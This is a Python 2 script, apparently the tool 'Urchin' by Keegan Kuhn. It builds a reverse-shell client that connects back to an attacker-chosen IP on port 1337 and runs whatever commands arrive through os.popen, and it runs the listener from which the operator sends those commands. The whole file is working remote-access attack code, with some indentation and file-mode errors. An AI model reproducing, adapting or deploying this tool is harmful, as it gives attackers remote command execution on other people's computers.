#!/usr/bin/python
import socket, os, sys

def connect():
	host = socket.gethostname()
	port = 1337
	s = socket.socket()
        s.bind((host, port))
	print ""
        print "                           Waiting for connection ..."
        s.listen(1)
        while True:
                c, addr = s.accept()
                print "                 Accepted connection from", addr
                print ""
                while True:
                        cmd = raw_input(">>> ")
                        c.send(cmd)
                        print c.recv(1024)
                        if cmd == "exit":
                                s.close()
                                sys.exit(1)

def build_cli():
	print ""
	ip = raw_input("Enter the server's IP Address: ")
	fn = raw_input("Enter a filename: ")
	print "Building file " + fn + " ..."
	with open(fn, "war") as f:
    		f.write('#!/usr/bin/python\n')
		sys.stdout.write("\r" + "[  5%] #")
    		sys.stdout.flush()
		f.write('import socket, os, sys\n')
		sys.stdout.write("\r" + "[ 10%] ##")
                sys.stdout.flush()
                f.write('s = socket.socket()\n')
                sys.stdout.write("\r" + "[ 15%] ###")
                sys.stdout.flush()
                f.write('host = "' + ip + '"\n')
                sys.stdout.write("\r" + "[ 20%] ####")
                sys.stdout.flush()
                f.write('port = 1337\n')
                sys.stdout.write("\r" + "[ 25%] #####")
                sys.stdout.flush()
                f.write('s.connect((host, port))\n')
                sys.stdout.write("\r" + "[ 30%] ######")
                sys.stdout.flush()
                f.write('while True:\n')
		sys.stdout.write("\r" + "[ 35%] #######")
                sys.stdout.flush()
                f.write('        cmd = s.recv(1024)\n')
                sys.stdout.write("\r" + "[ 40%] ########")
                sys.stdout.flush()
                f.write('        if cmd[:2] == "cd":\n')
                sys.stdout.write("\r" + "[ 45%] #########")
                sys.stdout.flush()
                f.write('                os.chdir(str(cmd[3:]))\n')
                sys.stdout.write("\r" + "[ 50%] ##########")
                sys.stdout.flush()
                f.write('                o = os.popen("cd").read()\n')
                sys.stdout.write("\r" + "[ 55%] ###########")
                sys.stdout.flush()
		f.write('		 s.send(o)\n')
                sys.stdout.write("\r" + "[ 60%] ############")
                sys.stdout.flush()
                f.write('	 elif cmd == "exit":\n')
                sys.stdout.write("\r" + "[ 75%] #############")
                sys.stdout.flush()
		f.write('		 s.close()\n')
                sys.stdout.write("\r" + "[ 80%] ##############")
                sys.stdout.flush()
                f.write('		 sys.exit(1)\n')
                sys.stdout.write("\r" + "[ 85%] ###############")
                sys.stdout.flush()
                f.write('	 else:\n')
                sys.stdout.write("\r" + "[ 90%] ################")
                sys.stdout.flush()
                f.write('	 	 o = os.popen(cmd).read()\n')
                sys.stdout.write("\r" + "[ 95%] #################")
                sys.stdout.flush()
                f.write('		 s.send(o)\n')
                sys.stdout.write("\r" + "[100%] ##################")
                sys.stdout.flush()
		print ""
		print ""
		print fn + " built !"
		print "For compilation help, see https://github.com/keeganjk/urchin."

def q():
	print ""
	print "Please select an option from the list below:"
	print "        [0] Build client file"
	print "        [1] Allow connections"
	print ""
	qq = raw_input(">>> ")
	if qq == "0":
		build_cli()
		q()
	elif qq == "1":
		connect()
	else:
		q()

os.system("cls")
os.system("clear")
print "                     |     |   | ,---` ,---` |   | ----- ,---`"
print "                   \ * /   |   | |   | |     |   |   |   |   |"
print "                   -*+*-   |   | |---, |     |---|   |   |   |"
print "                   / * \   |   | |  \  |     |   |   |   |   |"
print "                     |     `___, |   \ `___, |   | ----- |   |"
print ""
print "                         Made by Keegan Kuhn (keeganjk)"
print "                                 Version: 1.0"
q()
